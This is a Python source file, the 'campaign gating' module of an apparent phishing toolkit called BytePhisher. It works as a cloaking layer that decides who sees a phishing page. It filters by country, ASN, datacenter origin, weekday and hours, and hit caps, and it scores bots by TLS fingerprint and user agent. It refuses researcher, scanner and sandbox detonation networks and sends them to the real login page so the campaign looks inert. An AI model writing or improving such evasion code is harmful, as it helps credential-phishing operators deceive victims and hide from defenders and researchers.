# BytePhisher - campaign gating.
#
# Real campaigns get hammered by scanners, researchers and VPN traffic. Gating
# lets an operator decide *who* even sees the page, and it records every refusal
# so the totals reconcile ("412 visits, 37 served"):
#
#   * country allow/deny list
#   * datacenter / hosting ASN refusal (kills most automated scanning)
#   * active hours / weekdays (a "payroll portal" that only exists Mon-Fri 9-6)
#   * per-IP hit cap (sliding window)
#
# A refused visitor is sent to the decoy URL (normally the real login page) so
# the campaign looks inert instead of obviously malicious.
import contextlib
import ipaddress
import time

from . import blocklist, classify
from .classify import BOT_UA_EXEMPT, BOT_UA_MARKERS  # noqa: F401
from .classify import ua_bot_score as _ua_bot_score

DATACENTER_MARKERS = classify.DATACENTER_MARKERS

WEEKDAYS = {"mon": 0, "tue": 1, "wed": 2, "thu": 3, "fri": 4, "sat": 5, "sun": 6}


def parse_days(value):
    """'mon,fri,sat' or 'mon-fri' -> set of weekday ints.

    Raises ValueError on anything it cannot read: returning None silently
    DISABLES the weekday gate, which is the opposite of what the operator asked
    for (parse_hours was hardened for the same reason).
    """
    if not value:
        return None
    out = set()
    for raw in str(value).split(","):
        part = raw.strip().lower()
        if not part:
            continue
        if "-" in part:
            # NB: split the range BEFORE truncating to 3 chars, otherwise
            # "fri-mon" becomes "fri" and the range is silently lost
            a, _, b = part.partition("-")
            a, b = a.strip()[:3], b.strip()[:3]
            if a in WEEKDAYS and b in WEEKDAYS:
                start, end = WEEKDAYS[a], WEEKDAYS[b]
                if start <= end:
                    out.update(range(start, end + 1))
                else:  # wrap-around like fri-mon
                    out.update(list(range(start, 7)) + list(range(0, end + 1)))
        elif part[:3] in WEEKDAYS:
            out.add(WEEKDAYS[part[:3]])
        else:
            raise ValueError(f"unrecognised weekday {raw.strip()!r} "
                             f"(use mon,tue,... or mon-fri)")
    return out or None


def parse_hours(value):
    """'9-18' or '9:30-17:45' -> (start, end) in minutes.

    Raises ValueError on anything degenerate or unparseable: silently returning
    None used to disable the time gate entirely, so an operator who typed
    '--active-hours 9-9' believed a restriction was in force when it was not.
    """
    if not value:
        return None

    def to_min(tok, allow_end=False):
        tok = tok.strip()
        if ":" in tok:
            h, _, m = tok.partition(":")
            h, m = int(h), int(m)
        else:
            h, m = int(tok), 0
        # 24:00 is a legitimate "end of day" sentinel ("--active-hours 0-24")
        if allow_end and h == 24 and m == 0:
            return 1440
        if not (0 <= h <= 23 and 0 <= m <= 59):
            raise ValueError(f"hour out of range: {tok}")
        return h * 60 + m

    try:
        a, _, b = str(value).partition("-")
        start, end = to_min(a), to_min(b, allow_end=True)
    except Exception as e:
        raise ValueError(f"bad --active-hours '{value}' (use 9-18 or 9:30-17:45)") from e
    if start == end:
        raise ValueError(f"--active-hours '{value}' is empty (start == end) - "
                         f"remove the flag or widen the window")
    if start > end:
        raise ValueError(f"--active-hours '{value}' is inverted (start > end)")
    return (start, end)


# The marker list and the scorer live in core/classify.py, so the gate, the
# intel analysis and the risk score agree on what counts as a bot.


def _asn_key(value):
    """Normalise an ASN to digits (`AS15169`, `as15169` and `15169` are one key)."""
    text = str(value or "").strip().upper()
    if text.startswith("AS"):
        text = text[2:]
    return text if text.isdigit() else ""


class Gate:
    """Decides whether a visitor is served. Pure logic + an in-memory hit window,
    so it is cheap enough to run on every request."""

    def __init__(self, allow_countries=None, block_countries=None,
                 block_datacenter=False, active_hours=None, active_days=None,
                 max_hits_per_ip=0, window_seconds=3600, bot_threshold=0,
                 block_researchers=False, blocklist_file="", allow_asn=None,
                 block_asn=None, max_hits_per_device=0, detonation_asn=None,
                 detonation_cidr=None, cloak=False):
        self.allow = {c.strip().upper() for c in (allow_countries or []) if c.strip()}
        self.allow_asn = {_asn_key(a) for a in (allow_asn or []) if _asn_key(a)}
        self.block_asn = {_asn_key(a) for a in (block_asn or []) if _asn_key(a)}
        self.max_hits_per_device = int(max_hits_per_device or 0)
        self._device_hits = {}
        # Detonation ranges are the sandbox/vendor networks a URL is submitted to. They are
        # operator-supplied (a curated file or the flags) because the ranges move: a hardcoded
        # list of ASNs would be a guess, and a wrong guess either blocks real visitors or
        # lets a sandbox through.
        self.detonation_asn = {_asn_key(a) for a in (detonation_asn or []) if _asn_key(a)}
        self.detonation_nets = []
        for cidr in (detonation_cidr or []):
            with contextlib.suppress(Exception):
                self.detonation_nets.append(ipaddress.ip_network(str(cidr), strict=False))
        self.cloak = bool(cloak)
        if self.cloak:
            # one switch for the whole posture: serve the real site to anyone who looks like
            # a scanner, refuse the researcher networks, and never show our page to a
            # detonation range
            self.block_researchers = True
        self.block = {c.strip().upper() for c in (block_countries or []) if c.strip()}
        self.block_datacenter = bool(block_datacenter)
        self.hours = parse_hours(active_hours) if not isinstance(active_hours, tuple) else active_hours
        self.days = parse_days(active_days) if not isinstance(active_days, (set, frozenset)) else active_days
        self.max_hits = int(max_hits_per_ip or 0)
        self.window = int(window_seconds)
        self._hits = {}          # ip -> [timestamps]
        # bot gate: 0 = off, otherwise the score at which a visit gets the decoy
        self.bot_threshold = int(bot_threshold or 0)
        self.bot_gate = self.bot_threshold > 0
        # Researcher/scanner filtering: a hard refuse on identity (organisation,
        # address range, user agent), separate from the bot gate's scoring.
        self.block_researchers = bool(block_researchers) or self.cloak
        self.blocklist_file = blocklist_file or ""
        self.blocklist_entry = blocklist.load_file(self.blocklist_file)

    @property
    def enabled(self):
        return bool(self.allow or self.block or self.block_datacenter
                    or self.hours or self.days or self.max_hits or self.bot_gate
                    or self.block_researchers or self.allow_asn or self.block_asn
                    or self.max_hits_per_device)

    @property
    def needs_geo(self):
        """Only country/ISP rules require a (network) geo lookup per visitor."""
        return bool(self.allow or self.block or self.block_datacenter
                    or self.block_researchers)

    # ---- decisions ----
    # ---------------------------------------------------------- bot gate ---
    def bot_check(self, ja3=None, ua="", intel=None, score=None, reasons=None):
        """Verdict for a visit based on its fingerprint, not on its IP.

        Returns (action, score, reasons) where action is:
          "allow"  - treat as a real visitor
          "decoy"  - serve the decoy page, record the visit as a scanner
        `score`/`reasons` let a caller pass an already-computed score (the
        proxy computes JA3 + headless evidence together).
        """
        if not self.bot_gate:
            return "allow", 0, []
        if score is None:
            score = 0
            reasons = list(reasons or [])      # keep what the caller passed in
            try:
                from . import tls_fp
                if ja3:
                    score, why = tls_fp.bot_likelihood(ja3, ua)
                    reasons.extend(why)
            except Exception:
                pass
            score += _ua_bot_score(ua, reasons)
            if intel:
                hs = intel.get("headless_score")
                if isinstance(hs, (int, float)) and hs >= 60:
                    # the dump is already a 0-100 automation score with its own
                    # evidence; take it at face value rather than halving it
                    score = max(score, int(hs))
                    reasons.append(f"browser dump scored this client {hs}/100 for automation")
        reasons = list(reasons or [])
        if score >= self.bot_threshold:
            return "decoy", int(score), reasons
        return "allow", int(score), reasons

    @staticmethod
    def _country_tokens(country, country_code=""):
        """The values a country rule may match: the ISO code and the name.

        The geo layer knows both; an operator may write either.
        """
        return {str(x).strip().upper() for x in (country, country_code) if str(x or "").strip()}

    def check(self, ip=None, country=None, isp=None, now=None, ua="", org="", asn="",
              country_code=""):
        """Return (allowed, reason). `reason` is empty when allowed.

        Failure semantics, on purpose:
          * an *allow list* blocks when there is no geo data (nothing proves the
            visitor belongs to an allowed country) - fail closed;
          * the *datacenter filter* serves when there is no ISP data (nothing
            proves it is a datacenter) - fail open, so a geo outage cannot take
            the campaign dark.
        """
        now = now if now is not None else time.time()
        if self.block_researchers:
            blocked, why = blocklist.screen(ip=ip or "", ua=ua, org=org, isp=isp or "",
                                            asn=asn, entry=self.blocklist_entry)
            if blocked:
                return False, why
        tokens = self._country_tokens(country, country_code)
        if self.allow and not (tokens & self.allow):
            return False, (f"country {country or country_code or 'unknown'} "
                           f"not in allow list")
        if self.block and (tokens & self.block):
            hit = sorted(tokens & self.block)[0]
            return False, f"country {hit} is blocked"
        if self.block_datacenter and self._is_datacenter(isp):
            return False, f"datacenter network ({isp})"
        if self.days is not None and time.localtime(now).tm_wday not in self.days:
            return False, "outside active weekdays"
        if self.hours is not None:
            start, end = self.hours                      # minutes since midnight
            lt = time.localtime(now)
            cur = lt.tm_hour * 60 + lt.tm_min
            if not (start <= cur < end):
                def hhmm(m):
                    return f"{m // 60:02d}:{m % 60:02d}"
                return False, f"outside active hours ({hhmm(start)}-{hhmm(end)})"
        asn_key = _asn_key(asn)
        if self.detonation_asn and asn_key and asn_key in self.detonation_asn:
            return False, f"detonation range (ASN {asn_key})"
        if self.detonation_nets and ip:
            with contextlib.suppress(Exception):
                addr = ipaddress.ip_address(str(ip).split("%")[0])
                for net in self.detonation_nets:
                    if addr in net:
                        return False, f"detonation range ({net})"
        if self.block_asn and asn_key and asn_key in self.block_asn:
            return False, f"ASN {asn_key} is blocked"
        if self.allow_asn and asn_key not in self.allow_asn:
            # fail closed like the country allow list: no ASN data proves nothing
            return False, (f"ASN {asn_key or 'unknown'} not in allow list")
        if self.max_hits and self.hits(ip, now) >= self.max_hits:
            return False, f"hit cap reached ({self.max_hits} per {self.window}s)"
        return True, ""

    @staticmethod
    def _is_datacenter(isp):
        """One rule for the whole tool (core/classify.py)."""
        return classify.is_datacenter(isp)

    # ---- hit window ----
    MAX_HIT_IPS = 5000          # a spoofable header can invent addresses

    MAX_DEVICES = 5000

    def device_hits(self, device_token, now=None):
        """Requests seen from this device inside the window."""
        if not device_token:
            return 0
        now = now if now is not None else time.time()
        bucket = self._device_hits.get(device_token) or []
        cutoff = now - self.window
        bucket = [t for t in bucket if t >= cutoff]
        self._device_hits[device_token] = bucket
        return len(bucket)

    def note_device_hit(self, device_token, now=None):
        """Count one request against the device token (no-op without a token)."""
        if not device_token:
            return
        now = now if now is not None else time.time()
        bucket = self._device_hits.setdefault(device_token, [])
        bucket.append(now)
        cutoff = now - self.window
        self._device_hits[device_token] = [t for t in bucket if t >= cutoff]
        if len(self._device_hits) > self.MAX_DEVICES:
            for k in sorted(self._device_hits,
                            key=lambda k2: (self._device_hits[k2][-1]
                                            if self._device_hits[k2] else 0)):
                if len(self._device_hits) <= self.MAX_DEVICES // 2:
                    break
                self._device_hits.pop(k, None)

    def device_capped(self, device_token, extra=0, now=None):
        """(over, count) for the device cap: `extra` is the count already in the store."""
        if not self.max_hits_per_device or not device_token:
            return False, 0
        count = self.device_hits(device_token, now) + int(extra or 0)
        return count >= self.max_hits_per_device, count

    def note_hit(self, ip, now=None):
        now = now if now is not None else time.time()
        if not ip:
            return
        bucket = self._hits.setdefault(ip, [])
        bucket.append(now)
        cutoff = now - self.window
        self._hits[ip] = [t for t in bucket if t >= cutoff]
        if len(self._hits) > self.MAX_HIT_IPS:
            # drop the addresses whose newest hit is oldest, and any empty key
            for k in sorted(self._hits, key=lambda k2: (self._hits[k2][-1]
                                                        if self._hits[k2] else 0)):
                if len(self._hits) <= self.MAX_HIT_IPS // 2:
                    break
                self._hits.pop(k, None)
        else:
            for k in [k2 for k2, v2 in self._hits.items() if not v2]:
                self._hits.pop(k, None)

    def hits(self, ip, now=None):
        now = now if now is not None else time.time()
        cutoff = now - self.window
        return len([t for t in self._hits.get(ip, []) if t >= cutoff])

    @staticmethod
    def _hhmm(m):
        return f"{m // 60:02d}:{m % 60:02d}"

    def describe(self):
        bits = []
        if self.allow:
            bits.append("allow " + ",".join(sorted(self.allow)))
        if self.block:
            bits.append("block " + ",".join(sorted(self.block)))
        if self.block_datacenter:
            bits.append("no-datacenter")
        if self.days is not None:
            bits.append("days " + ",".join(sorted(WEEKDAYS, key=WEEKDAYS.get) and
                                             [k for k, v in sorted(WEEKDAYS.items(), key=lambda kv: kv[1]) if v in self.days]))
        if self.hours:
            bits.append(f"hours {self._hhmm(self.hours[0])}-{self._hhmm(self.hours[1])}")
        if self.allow_asn:
            bits.append("asn-allow " + ",".join(sorted(self.allow_asn)))
        if self.block_asn:
            bits.append("asn-block " + ",".join(sorted(self.block_asn)))
        if self.max_hits:
            bits.append(f"cap {self.max_hits}/{self.window}s")
        if self.max_hits_per_device:
            bits.append(f"device-cap {self.max_hits_per_device}/{self.window}s")
        if self.detonation_asn:
            bits.append(f"no-detonation-asn ({len(self.detonation_asn)})")
        if self.detonation_nets:
            bits.append(f"no-detonation-cidr ({len(self.detonation_nets)})")
        if self.cloak:
            bits.append("cloak")
        if self.block_researchers:
            bits.append("no-researchers"
                        + (f" ({self.blocklist_file})" if self.blocklist_file else ""))
        return " | ".join(bits) if bits else "off"
